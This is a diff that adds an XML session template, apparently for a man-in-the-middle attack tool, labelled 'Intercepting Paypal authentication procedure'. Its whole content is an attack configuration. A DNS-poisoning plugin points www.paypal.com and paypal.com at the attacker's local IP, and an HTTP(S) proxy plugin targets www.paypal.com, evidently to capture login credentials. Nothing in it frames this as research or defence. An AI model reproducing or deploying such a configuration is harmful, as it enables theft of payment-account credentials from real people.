@@ -1,0 +1,33 @@
+	<SessionTemplate>
+<Config name="authentication_paypal" description="Intercepting Paypal authentication procedure">
+</Config>
+
+<Plugins>
+<Plugin name="DNS Poisoning" dirname="DNSPoisoning">
+
+<ArrayOfDNSPoisonRecord xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
+  <DNSPoisonRecord>
+    <HostName>www.paypal.com</HostName>
+    <IPAddress>@LOCALIP</IPAddress>
+  </DNSPoisonRecord>
+  <DNSPoisonRecord>
+    <HostName>paypal.com</HostName>
+    <IPAddress>@LOCALIP</IPAddress>
+  </DNSPoisonRecord>  
+</ArrayOfDNSPoisonRecord>
+</Plugin>
+
+
+<Plugin name="HTTP(S) proxy" dirname="HTTPProxy">
+
+<PluginData xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
+  <RemoteHost>www.paypal.com</RemoteHost>
+  <RedirectURL />
+  <Records />
+</PluginData>
+</Plugin>
+
+
+</Plugins>
+
+</SessionTemplate>
